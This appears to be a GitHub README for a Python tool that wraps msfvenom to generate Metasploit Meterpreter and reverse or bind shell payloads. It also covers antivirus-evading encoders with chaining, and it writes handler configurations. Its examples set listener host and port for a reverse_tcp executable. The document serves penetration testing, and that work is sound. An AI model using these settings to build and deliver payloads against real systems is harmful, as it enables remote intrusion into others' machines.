# MSFVenom Payload Generator

Interactive command-line tool for generating Metasploit payloads and handler configurations. Built for penetration testers and security researchers.

## Features

### Payload generation
- 30+ payload types (Meterpreter, Shell, stageless)
- Cross-platform support: Windows, Linux, Android, macOS, PHP, Python, Java
- x86 and x64 architectures
- Category-based listing for faster selection

### Encoders
- 30+ encoders (e.g., Shikata Ga Nai, Alpha Mixed, XOR)
- Encoder chaining supported
- Configurable iteration count
- Grouped by architecture and type

### Remote execution
- SSH execution on a remote Kali server
- Automatic SCP download after generation
- Local/remote execution switch
- Connection validation

### Automation
- Generates Metasploit handler `rc` files
- Complete handler configuration
- Ready-to-run commands
- Configuration summary before generation

## Architecture

```python
MSFPayloadGenerator
├── check_msfvenom()          
├── get_user_input()          
├── generate_payload()        
├── generate_listener_config()
└── run()                     
```

## Installation and Usage

### Requirements
- Python 3.8+
- Metasploit Framework (`msfvenom`)
- SSH client (optional, for remote execution)

### Quick start
```bash
git clone https://github.com/alex-chh/msf-payload-generator.git
cd msf-payload-generator

python msf_payload_generator.py
```

### Example
```bash
? Platform: windows
? Architecture: x64
? Payload: meterpreter/reverse_tcp
? LHOST: 192.168.1.100
? LPORT: 4444
? Output format: exe
? Encoder: x86/shikata_ga_nai (3 iterations)

msfconsole -r listener.rc
```

## Supported payloads

### Meterpreter
- `meterpreter/reverse_tcp` - Reverse TCP
- `meterpreter/reverse_http` - Reverse HTTP
- `meterpreter/reverse_https` - Reverse HTTPS
- `meterpreter/reverse_tcp_ssl` - Reverse TCP over SSL
- `meterpreter/reverse_winhttp` - Windows HTTP
- `meterpreter/reverse_winhttps` - Windows HTTPS

### Shell
- `shell/reverse_tcp` - Reverse TCP shell
- `shell/bind_tcp` - Bind TCP shell
- `shell/reverse_http` - Reverse HTTP shell
- `shell/reverse_https` - Reverse HTTPS shell

### Stageless
- `meterpreter_reverse_tcp`
- `meterpreter_reverse_http`
- `meterpreter_reverse_https`

### Platform-specific
- Windows: x86/x64 Meterpreter/Shell
- Linux: x86/x64 Meterpreter/Shell
- Android: Meterpreter HTTP/HTTPS
- Web: PHP/Python/Java

## Encoders

### x86
- `x86/shikata_ga_nai` - Polymorphic encoder
- `x86/alpha_mixed`
- `x86/alpha_upper`
- `x86/xor`
- `x86/unicode_mixed`

### x64
- `x64/xor`
- `x64/xor_dynamic`
- `x64/zutto_dekiru`

### Chained examples
- `x86/shikata_ga_nai + x86/alpha_upper`
- `x86/shikata_ga_nai + x86/xor`
- `x86/shikata_ga_nai + x64/xor`

## Remote execution

### SSH configuration
```bash
? SSH host: 192.168.1.200
? SSH user: kali
? Password/key: [validated]

Remote generation and file download supported via SSH/SCP.
```

### Advantages
- Encrypted transport over SSH
- Offload local resources
- Automatic retry on transient errors
- Live execution status

## Output formats

| Platform | Formats | Notes |
|------|----------|------|
| Windows | exe, dll, psh | Executable, DLL, PowerShell |
| Linux | elf, so | ELF executable, shared library |
| Android | apk | Android package |
| Web | php, py | PHP/Python scripts |
| macOS | macho | Mach-O executable |

## Advanced

### Programmatic usage
```python
from msf_payload_generator import MSFPayloadGenerator

generator = MSFPayloadGenerator()
generator.payload_config = {
    'platform': 'windows',
    'arch': 'x64',
    'payload_type': 'meterpreter/reverse_tcp',
    'lhost': '192.168.1.100',
    'lport': '4444',
    'encoder': 'x86/shikata_ga_nai',
    'iterations': 3
}

generator.generate_payload()
generator.generate_listener_config()
```

### Batch generation
Supports generating multiple payloads via configuration files.

### Logging
Complete execution logs for auditing and troubleshooting.

## Compatibility Guide

### Payload with platform prefixes
- If the selected `payload_type` already contains a platform prefix (e.g., `windows/x64/meterpreter/reverse_https`, `linux/x64/shell/reverse_tcp`), the generator uses it directly and does not prepend `platform/arch` again.

### Encoder compatibility
- For `x86` targets, prefer `x86/*` encoders; `x64/*` and other architectures (`ppc/`, `sparc/`, `mips*`) are incompatible.
- For `x64` targets, prefer `x64/*` encoders; `x86/*` and other architectures are incompatible.
- Generic encoders (`generic/*`, `cmd/*`, `php/*`) are cross-architecture.
- Chained encoders (`a + b`) are considered compatible only if each encoder is compatible.

### Grouping and fallback
- The encoder selection lists a "Recommended (compatible)" section first, followed by other groups. Empty groups show `(none)`.
- Selecting an incompatible encoder triggers guidance to reselect from the recommended list; if none exist, it falls back to no encoder.

### Common errors
- `Error: invalid payload: windows/x64/windows/meterpreter/reverse_https` occurs if both a platform-prefixed payload is selected and `platform/arch` is concatenated again. The generator now detects and uses the prefixed payload directly in both the command and handler config.

## Security best practices

### Input validation
- Validates and sanitizes all user input
- Protects against command injection
- Prevents path traversal

### Execution safety
- Timeout control prevents hanging processes
- Resource usage limits
- Error handling and logging

### Transport security
- SSH encrypted transfer
- File permission management
- Sensitive data protection

## Performance

### Generation speed
| Payload type | Local | Remote |
|--------------|-------|--------|
| Windows exe  | ~2–3s | ~5–8s  |
| Linux elf    | ~1–2s | ~3–5s  |
| Android apk  | ~10–15s | ~15–25s |

### Resource usage
- Memory: < 50MB
- CPU: < 5%
- Network: minimal transfer

## Development and contribution

### Project structure
```
msf-payload-generator/
├── msf_payload_generator.py
├── requirements.txt
├── README.md
├── examples/
│   ├── windows_payload.exe
│   └── listener.rc
├── tests/
│   ├── test_generator.py
│   └── test_configs.py
└── docs/
    ├── payload_types.md
    └── encoders_guide.md
```

### Contribution guide
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit changes (`git commit -m 'Add some AmazingFeature'`)
4. Push the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

### Tests
```bash
python -m pytest tests/

python tests/integration_test.py
```

## Version history

### v1.0.0 (2024-12-08)
- Initial release
- Basic payload generation
- Interactive CLI
- Handler config generation
- Remote execution support

## Contributors

- **Alex Chen** - [alex-chh](https://github.com/alex-chh) - creator and maintainer

Issues and Pull Requests are welcome.

## License

MIT License — see [LICENSE](LICENSE).

## Acknowledgements

- Metasploit Framework team
- Python community
- Security research community

## Related projects

- [pentest-automation-framework-2025](https://github.com/alex-chh/pentest-automation-framework-2025)
- [sliver-c2-dropper](https://github.com/alex-chh/sliver-c2-dropper)
- [vba-red-team-testing-framework](https://github.com/alex-chh/vba-red-team-testing-framework)

## Support

If you encounter issues or have suggestions:

- [Open an Issue](https://github.com/alex-chh/msf-payload-generator/issues)
- [Discussions](https://github.com/alex-chh/msf-payload-generator/discussions)
- Email: [maintainer](mailto:)

---

If this project helps you, consider starring the repository.
